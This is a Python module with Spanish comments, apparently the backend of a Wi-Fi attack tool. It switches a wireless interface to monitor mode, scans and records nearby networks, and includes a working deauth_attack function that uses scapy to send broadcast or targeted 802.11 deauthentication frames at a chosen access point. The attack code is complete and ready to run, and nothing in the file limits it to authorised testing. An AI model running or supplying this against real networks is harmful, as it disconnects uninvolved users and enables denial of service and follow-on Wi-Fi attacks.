import subprocess
import json
import logging
from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth
import csv

def execute_command(command):
    """Ejecuta un comando en la terminal y retorna su salida."""
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        logging.info(f"Comando ejecutado: {' '.join(command)}")
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        logging.error(f"Error al ejecutar comando: {' '.join(command)}\n{e.stderr}")
        raise e

def list_interfaces():
    """Lista todas las interfaces de red disponibles."""
    try:
        result = execute_command(["ip", "link", "show"])
        interfaces = []
        for line in result.split('\n'):
            if ": " in line:
                interface = line.split(": ")[1].split(":")[0]
                if interface != "lo":
                    interfaces.append(interface)
        logging.info(f"Interfaces disponibles: {interfaces}")
        return interfaces
    except Exception as e:
        logging.error(f"Error al listar interfaces: {e}")
        return []

def start_monitor_mode(interface):
    """Cambia la interfaz al modo monitor."""
    try:
        logging.info(f"Eliminando procesos que interfieren con el modo monitor para {interface}...")
        execute_command(["sudo", "airmon-ng", "check", "kill"])
        
        logging.info(f"Configurando la interfaz {interface} en modo monitor...")
        execute_command(["sudo", "ip", "link", "set", interface, "down"])
        execute_command(["sudo", "iwconfig", interface, "mode", "monitor"])
        execute_command(["sudo", "ip", "link", "set", interface, "up"])
        return {"message": f"Interfaz {interface} configurada en modo monitor"}, 200
    except Exception as e:
        logging.error(f"Error al iniciar modo monitor en {interface}: {e}")
        return {"error": str(e)}, 500

def stop_monitor_mode(interface):
    """Cambia la interfaz al modo gestionado."""
    try:
        logging.info(f"Restaurando la interfaz {interface} a modo gestionado...")
        execute_command(["sudo", "ip", "link", "set", interface, "down"])
        execute_command(["sudo", "iwconfig", interface, "mode", "managed"])
        execute_command(["sudo", "ip", "link", "set", interface, "up"])
        return {"message": f"Interfaz {interface} configurada en modo gestionado"}, 200
    except Exception as e:
        logging.error(f"Error al detener modo monitor en {interface}: {e}")
        return {"error": str(e)}, 500

def reset_interface(interface):
    """Reinicia la interfaz de red."""
    try:
        logging.info(f"Reiniciando la interfaz {interface}...")
        execute_command(["sudo", "ip", "link", "set", interface, "down"])
        execute_command(["sudo", "ip", "link", "set", interface, "up"])
        return {"message": f"Interfaz {interface} reiniciada"}, 200
    except Exception as e:
        logging.error(f"Error al reiniciar la interfaz: {e}")
        return {"error": str(e)}, 500

def scan_wifi(interface):
    """Escanea las redes Wi-Fi disponibles."""
    logging.info(f"Escaneando redes con la interfaz {interface}...")
    try:
        result = execute_command(["sudo", "iwlist", interface, "scan"])
        networks = parse_iwlist_output(result)
        logging.info(f"Redes encontradas: {len(networks)}")
        return networks, 200
    except Exception as e:
        logging.error(f"Error al escanear redes: {e}")
        return {"error": str(e)}, 500

def parse_iwlist_output(output):
    """Parsea la salida del comando iwlist para extraer información de redes."""
    networks = []
    network = {}
    for line in output.split('\n'):
        if "Cell" in line:
            if network:
                networks.append(network)
            network = {}
            parts = line.split()
            network["BSSID"] = parts[4]
        elif "ESSID" in line:
            network["SSID"] = line.split(":")[1].strip('"')
        elif "Channel" in line:
            network["Channel"] = line.split(":")[1]
        elif "Quality" in line:
            network["Quality"] = line.split("=")[1].split()[0]
        elif "Encryption key" in line:
            network["Encryption"] = "on" if "on" in line else "off"
    if network:
        networks.append(network)
    return networks

def deauth_attack(interface, bssid, client_mac=None):
    """Realiza un ataque de desautenticación."""
    logging.info(f"Iniciando ataque de desautenticación en BSSID: {bssid}")
    pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=client_mac or "ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    try:
        sendp(pkt, iface=interface, count=100, inter=0.1, verbose=True)
        logging.info(f"Ataque enviado exitosamente a {bssid} {f'contra cliente {client_mac}' if client_mac else ''}")
    except Exception as e:
        logging.error(f"Error al enviar paquetes de desautenticación: {e}")

def save_scan_results_to_csv(data, filename="scan_results.csv"):
    """Guarda los resultados del escaneo en un archivo CSV."""
    try:
        with open(filename, mode='w', newline='') as file:
            writer = csv.writer(file)
            writer.writerow(["SSID", "BSSID", "Canal", "Encriptación"])
            for network in data:
                writer.writerow([network.get("SSID"), network.get("BSSID"),
                                 network.get("Channel"), network.get("Encryption")])
        logging.info(f"Resultados guardados en {filename}")
        return {"message": "Resultados guardados exitosamente"}
    except Exception as e:
        logging.error(f"Error al guardar resultados: {e}")
        return {"error": f"No se pudieron guardar los resultados: {str(e)}"}

def save_scan_results_to_json(data, filename="scan_results.json"):
    """Guarda los resultados del escaneo en un archivo JSON."""
    try:
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)
        logging.info(f"Resultados guardados en {filename}")
        return {"message": "Resultados guardados exitosamente"}
    except Exception as e:
        logging.error(f"Error al guardar resultados: {e}")
        return {"error": f"No se pudieron guardar los resultados: {str(e)}"}
